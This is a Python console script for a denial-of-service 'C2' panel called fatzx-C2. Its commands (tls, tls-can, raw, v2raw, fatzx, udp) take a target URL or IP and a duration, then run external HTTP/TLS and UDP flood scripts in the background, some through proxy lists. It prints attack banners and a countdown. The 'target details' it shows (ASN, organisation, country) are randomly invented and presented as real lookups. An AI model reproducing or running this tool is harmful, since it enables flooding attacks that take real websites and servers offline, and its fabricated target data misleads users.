# -*- coding: utf-8 -*-
import os
import sys
import random
import time
from datetime import datetime
from colorama import Fore, Back, init

init(autoreset=True)

def waktu():
    return datetime.now().strftime("%b %d %Y %H:%M:%S")

def country():
    countries = {
        "United States": "US",
        "United Kingdom": "UK",
        "Canada": "CA",
        "Australia": "AU",
    }
    random_country = random.choice(list(countries.keys()))
    return random_country, countries[random_country]

def get_asn_org():
    asn = random.randint(10000, 99999)
    org = random.choice(["OVH", "Cloudflare Inc."])
    return str(asn), org

def attack_details(method, target, time):
    target_type = "IP" if method == "udp" else "Host"
    nama_negara, singkatan = country()
    asn, org = get_asn_org()
    
    print(f"""
\x1b[38;2;214;4;844m   Attack Details:
\x1b[38;2;134;20;846m     {target_type}:    [{Fore.GREEN} {target} {Fore.RESET}]
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET} seconds]
\x1b[38;2;134;20;846m     Method:  [{Fore.GREEN} {method} {Fore.RESET}]
\x1b[38;2;134;20;846m     Sent On: [{Fore.GREEN} {waktu()} {Fore.RESET}]

\x1b[38;2;214;4;844m   Target Details:
\x1b[38;2;134;20;846m     Server ASN:    [{Fore.GREEN} {asn} {Fore.RESET}]
\x1b[38;2;134;20;846m     Server ORG:    [{Fore.GREEN} {org} {Fore.RESET}]
\x1b[38;2;134;20;846m     Server Country: [{Fore.GREEN} {nama_negara} ({singkatan}) {Fore.RESET}]
""")

def countdown(time_in_seconds):
    while time_in_seconds:
        mins, secs = divmod(time_in_seconds, 60)
        timer = f'{mins:02d}:{secs:02d}'
        print(f"Attack will end in: {timer}", end="\r")
        time.sleep(1)
        time_in_seconds -= 1
    print("\nAttack selesai, silahkan attack lagi")
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
  ┌──────────────────────────────────────────────────────────────────────────┐
  │ \033[1;31mFATZX ULALA\033[0m                                                               │
  └──────────────────────────────────────────────────────────────────────────┘
""")
    time.sleep(3)
    os.system('cls' if os.name == 'nt' else 'clear')
    print_home_screen()

def stop_attack():
    os.system('pkill screen')
    print("All attacks have been stopped.")

def print_home_screen():
    print("""
  ┌──────────────────────────────────────────────────────────────────────────┐
  │ \033[1;31mFATZX GOOD\033[0m                                                               │
  └──────────────────────────────────────────────────────────────────────────┘
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_home_screen()

    while True:
        sys.stdout.write(f"\x1b]2;[-] fatzx-C2 / User [root] / Expry [Dec 25 2025 / Slot 67/200\x07")
        sin = input(" " + Back.RED + Fore.WHITE + " root@Fatzx " + Fore.RESET + Back.RESET + " ►► ")
        sinput = sin.split(" ")[0]
        if sinput == "restart":
            os.system("python3 main.py")
        elif sinput == "clear":
            os.system("clear")
            main()
        elif sinput == "stop":
            stop_attack()
        elif sinput == "tls":
            try:
                url = sin.split()[1]
                attack_time = int(sin.split()[2])
                os.system('clear')
                os.system(f'screen -dm node tls.js {url} 39 {attack_time}')
                attack_details("tls", url, attack_time)
                countdown(attack_time)
            except IndexError:
                print("Usage: tls <url> <time>")
        elif sinput == "tls-can":
            try:
                url = sin.split()[1]
                attack_time = int(sin.split()[2])
                os.system('clear')
                os.system(f'screen -dm node tls-can.js {url} {attack_time} 39 9 proxy.txt')
                attack_details("tls-can", url, attack_time)
                countdown(attack_time)
            except IndexError:
                print("Usage: tls-can <url> <time>")
        elif sinput == "raw":
            try:
                url = sin.split()[1]
                attack_time = int(sin.split()[2])
                os.system('clear')
                os.system(f'screen -dm node raw.js {url} {attack_time} 9 proxy.txt 39')
                attack_details("raw", url, attack_time)
                countdown(attack_time)
            except IndexError:
                print("Usage: raw <url> <time>")
        elif sinput == "v2raw":
            try:
                url = sin.split()[1]
                attack_time = int(sin.split()[2])
                os.system('clear')
                os.system(f'screen -dm node v2raw.js {url} {attack_time} 39 9 proxy.txt')
                attack_details("v2raw", url, attack_time)
                countdown(attack_time)
            except IndexError:
                print("Usage: v2raw <url> <time>")
        elif sinput == "fatzx":
            try:
                url = sin.split()[1]
                attack_time = int(sin.split()[2])
                os.system('clear')
                os.system(f'screen -dm node fatzx.js {url} {attack_time} 39 9')
                attack_details("fatzx", url, attack_time)
                countdown(attack_time)
            except IndexError:
                print("Usage: fatzx <url> <time>")
        elif sinput == "udp":
            try:
                ip = sin.split()[1]
                port = sin.split()[2]
                attack_time = int(sin.split()[3])
                os.system('clear')
                os.system(f'perl udp.pl --ip {ip} --port {port} --size 25000 --time {attack_time} --method udp')
                attack_details("udp", ip, attack_time)
                countdown(attack_time)
            except IndexError:
                print("Usage: udp <ip> <port> <time>")

main()
